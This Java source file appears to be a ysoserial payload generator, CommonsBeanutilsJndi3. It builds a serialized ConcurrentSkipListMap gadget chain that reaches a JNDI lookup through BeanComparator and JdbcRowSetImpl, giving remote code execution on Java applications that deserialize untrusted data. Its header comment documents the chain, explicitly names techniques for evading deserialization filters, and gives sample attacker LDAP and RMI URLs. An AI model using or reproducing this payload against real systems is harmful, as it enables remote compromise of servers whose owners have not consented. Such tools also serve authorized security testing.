package ysoserial.payloads;

import java.io.Serializable;
import java.util.Arrays;
import java.util.Vector;
import java.util.concurrent.ConcurrentSkipListMap;

import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import com.sun.rowset.JdbcRowSetImpl;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	JNDI sink via ConcurrentSkipListMap — no TemplatesImpl, no commons-collections.
	Works on JDK 17+ without --add-opens.

	Gadget chain:
		ObjectInputStream.readObject()
			ConcurrentSkipListMap.readObject()
				ConcurrentSkipListMap.put()
					BeanComparator.compare()
						PropertyUtils.getProperty(jdbcRowSet, "databaseMetaData")
							JdbcRowSetImpl.getDatabaseMetaData()
								JdbcRowSetImpl.connect()
									InitialContext.lookup(dataSourceName)
										JNDI -> LDAP/RMI -> RCE

	Filter evasion:
		1. ConcurrentSkipListMap — not in any known filter
		2. No PriorityQueue/TreeBag/HashMap/HashSet
		3. No commons-collections in serialized payload
		4. No TemplatesImpl — JDK 17+ without module opens

	Usage: payload arg = JNDI URL
		e.g. "ldap://attacker.com:1389/Exploit"
		     "rmi://attacker.com:1099/Exploit"

	Requires:
		commons-beanutils 1.9.x
		Target allows outbound JNDI
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({ Authors.DMBS335 })
public class CommonsBeanutilsJndi3 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String jndiUrl) throws Exception {
		JdbcRowSetImpl rowset1 = createRowSet(jndiUrl);
		JdbcRowSetImpl rowset2 = createRowSet(jndiUrl);

		// Safe comparator for construction — CC4 classes used only at build time
		InvokerTransformer safeTransformer = new InvokerTransformer(
			"toString", new Class[0], new Object[0]);
		TransformingComparator safeComp = new TransformingComparator(safeTransformer);

		ConcurrentSkipListMap<Object, Object> map = new ConcurrentSkipListMap<>(safeComp);
		map.put(rowset1, "a");  // first — no compare
		map.put(rowset2, "b");  // second — compare via toString, unique per instance

		// Armed comparator — JNDI via databaseMetaData getter
		BeanComparator beanComp = new BeanComparator(
			"databaseMetaData", String.CASE_INSENSITIVE_ORDER);

		// Swap comparator — only BeanComparator is serialized
		Reflections.setFieldValue(map, "comparator", beanComp);

		return map;
	}

	private JdbcRowSetImpl createRowSet(String jndiUrl) throws Exception {
		JdbcRowSetImpl rowset = new JdbcRowSetImpl();
		rowset.setDataSourceName(jndiUrl);
		Reflections.setFieldValue(rowset, "iMatchColumns",
			new Vector<Integer>(Arrays.asList(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1)));
		Reflections.setFieldValue(rowset, "strMatchColumns",
			new Vector<String>(Arrays.asList("","","","","","","","","","")));
		return rowset;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutilsJndi3.class, args);
	}
}
